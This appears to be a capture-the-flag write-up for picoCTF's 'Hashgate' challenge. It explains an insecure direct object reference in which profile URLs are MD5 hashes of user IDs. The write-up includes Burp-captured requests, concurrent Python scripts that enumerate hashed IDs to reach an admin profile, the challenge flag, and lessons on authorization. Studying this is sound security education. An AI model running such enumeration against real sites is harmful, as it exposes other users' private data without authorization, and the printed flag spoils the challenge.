# Hashgate

## Challenge Information

| Attribute | Details |
| :--- | :--- |
| **Platform** | picoCTF |
| **Category** | Web Exploitation |
| **Challenge** | Hashgate |
| **Difficulty** | Beginner/Intermediate |
| **Vulnerability** | IDOR (Insecure Direct Object Reference) |
| **Tools** | Burp Suite, Python, curl, md5sum |

---

## Objective

The objective was to access the administrator's profile and retrieve the flag.

The application provides a login portal where a guest user can authenticate. After login, the application redirects the user to a profile URL containing a hash-like identifier.

The goal was to determine how this identifier was generated and whether it could be manipulated to access another user's profile.

---

## 1. Initial Reconnaissance

After starting the challenge instance, the application presented a login page.

The HTML source contained the following comment:

```html
<!-- Email: guest@picoctf.org Password: guest -->
````

This provided valid guest credentials:

```text
Email: guest@picoctf.org
Password: guest
```

---

## 2. Inspecting the Login Request

Burp Suite was used to intercept the login request.

The request was:

```http
POST /login HTTP/1.1
Host: crystal-peak.picoctf.net:<PORT>
Content-Type: application/json

{
    "email": "guest@picoctf.org",
    "password": "guest"
}
```

The server responded with:

```http
HTTP/1.1 302 Found
Location: /profile/user/e93028bdc1aacdfb3687181f2031765d
```

The application redirected the authenticated guest to:

```text
/profile/user/e93028bdc1aacdfb3687181f2031765d
```

At first glance, the value looked like a random identifier.

---

## 3. Inspecting the Profile Request

The profile request was:

```http
GET /profile/user/e93028bdc1aacdfb3687181f2031765d HTTP/1.1
Host: crystal-peak.picoctf.net:<PORT>
```

The response contained:

```text
Access level: Guest (ID: 3000).
Insufficient privileges to view classified data.
Only top-tier users can access the flag.
```

This revealed an important piece of information:

```text
Guest ID = 3000
```

The URL contained:

```text
e93028bdc1aacdfb3687181f2031765d
```

So the next step was to determine whether the URL value was derived from the user ID.

---

## 4. Identifying the Hash

I tested whether the profile identifier was an MD5 hash of the numeric user ID.

The following command was used:

```bash
printf '3000' | md5sum
```

Output:

```text
e93028bdc1aacdfb3687181f2031765d
```

This exactly matched the profile identifier:

```text
/profile/user/e93028bdc1aacdfb3687181f2031765d
```

Therefore:

```text
MD5("3000")
        ↓
e93028bdc1aacdfb3687181f2031765d
```

The profile URL was therefore effectively based on:

```text
/profile/user/MD5(user_id)
```

This was a major clue because the identifier was not an unpredictable random ID.

---

## 5. Testing Other User IDs

Since the profile identifier could be generated from a numeric user ID, I wrote a Python script to automate the process.

The initial version tested IDs sequentially:

```python
import hashlib
import requests

BASE = "http://crystal-peak.picoctf.net:<PORT>/profile/user/"

for user_id in range(1, 4001):
    profile_hash = hashlib.md5(str(user_id).encode()).hexdigest()
    url = BASE + profile_hash

    r = requests.get(url)

    if r.status_code == 200:
        print(f"[+] ID {user_id} -> {profile_hash}")
        print(r.text[:300])
```

However, sending requests sequentially was slow.

---

## 6. Improving the Enumeration Script

To make the enumeration faster, I used Python's `ThreadPoolExecutor` to send multiple requests concurrently.

```python
import hashlib
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE = "http://crystal-peak.picoctf.net:<PORT>/profile/user/"

def check_user(user_id):
    profile_hash = hashlib.md5(str(user_id).encode()).hexdigest()
    url = BASE + profile_hash

    try:
        r = requests.get(url, timeout=3)

        if r.status_code == 200:
            return user_id, profile_hash, r.text

    except requests.RequestException:
        pass

    return None


print("[*] Starting fast Hashgate enumeration...")
print(f"[*] Target: {BASE}")
print("[*] Testing IDs 1-4000")
print("[*] Using 30 concurrent workers...\n")

with ThreadPoolExecutor(max_workers=30) as executor:

    futures = [
        executor.submit(check_user, user_id)
        for user_id in range(1, 4001)
    ]

    completed = 0

    for future in as_completed(futures):
        completed += 1

        result = future.result()

        if completed % 100 == 0:
            print(f"[*] Progress: {completed}/4000")

        if result:
            user_id, profile_hash, response = result

            print("\n" + "=" * 60)
            print("[+] VALID PROFILE FOUND!")
            print(f"[+] User ID : {user_id}")
            print(f"[+] MD5     : {profile_hash}")
            print(f"[+] URL     : {BASE}{profile_hash}")
            print("[+] Response:")
            print(response[:500])
            print("=" * 60)
```

---

## 7. Discovering the Admin Profile

The enumeration produced the known guest profile:

```text
User ID : 3000
MD5     : e93028bdc1aacdfb3687181f2031765d

Response:
Access level: Guest (ID: 3000).
Insufficient privileges to view classified data.
```

More importantly, another valid profile was discovered:

```text
User ID : 3010
MD5     : 22722a343513ed45f14905eb07621686
```

Requesting:

```text
/profile/user/22722a343513ed45f14905eb07621686
```

returned:

```text
Welcome, admin! Here is the flag: picoCTF{id0r_unl0ck_049a794d}
```

---

## 8. Vulnerability Analysis

The vulnerability is an example of **Insecure Direct Object Reference (IDOR)**.

The application exposes user profiles through a predictable object reference:

```text
/profile/user/<MD5(user_id)>
```

Although MD5 makes the identifier look less obvious, it does not provide authorization.

Once the relationship was discovered:

```text
user ID → MD5 → profile URL
```

other profile identifiers could be generated.

The application then allowed the profile to be accessed without properly verifying whether the authenticated user was authorized to view that profile.

The important security issue was therefore not that MD5 was "cracked."

Instead, the issue was:

> [!IMPORTANT]
> ```text
> Predictable object reference
>             +
> Missing/insufficient authorization check
>             =
> IDOR
> ```

---

## 9. Attack Flow

```text
Guest Login
     │
     ▼
guest@picoctf.org / guest
     │
     ▼
Guest ID = 3000
     │
     ▼
MD5("3000")
     │
     ▼
e93028bdc1aacdfb3687181f2031765d
     │
     ▼
/profile/user/<hash>
     │
     ▼
Identify ID → MD5 relationship
     │
     ▼
Enumerate numeric IDs
     │
     ▼
ID = 3010
     │
     ▼
MD5("3010")
     │
     ▼
22722a343513ed45f14905eb07621686
     │
     ▼
Admin Profile
     │
     ▼
FLAG
```

---

## 10. Key Lessons Learned

### 1. Don't assume a hash is random

The profile identifier looked random:

```text
e93028bdc1aacdfb3687181f2031765d
```

Testing known values revealed that it was simply:

```text
MD5(user_id)
```

---

### 2. Encoding/hashing is not authorization

Even though the user ID was transformed using MD5, the application still exposed a predictable relationship.

Hashing an object identifier does not replace access-control checks.

---

### 3. Always inspect application behavior

Burp Suite made it possible to observe:

```text
POST /login
        ↓
302 Redirect
        ↓
GET /profile/user/<hash>
```

Understanding the complete request flow was more useful than immediately attempting random attacks.

---

### 4. Automate repetitive CTF tasks

Instead of manually calculating thousands of MD5 hashes and testing URLs, Python was used to automate the process.

Using concurrent requests significantly reduced enumeration time.

---

## 11. Flag

```text
picoCTF{id0r_unl0ck_049a794d}
```

---

## 12. Conclusion

Hashgate demonstrated how an application can become vulnerable when user-controlled object references are exposed without proper authorization checks.

The profile URL appeared to contain an unpredictable identifier, but analysis showed that it was simply the MD5 hash of the numeric user ID.

By identifying this relationship and automating the enumeration of user IDs, the administrator's profile was discovered and the flag was obtained.

The main vulnerability was **IDOR caused by insufficient authorization on the profile endpoint**.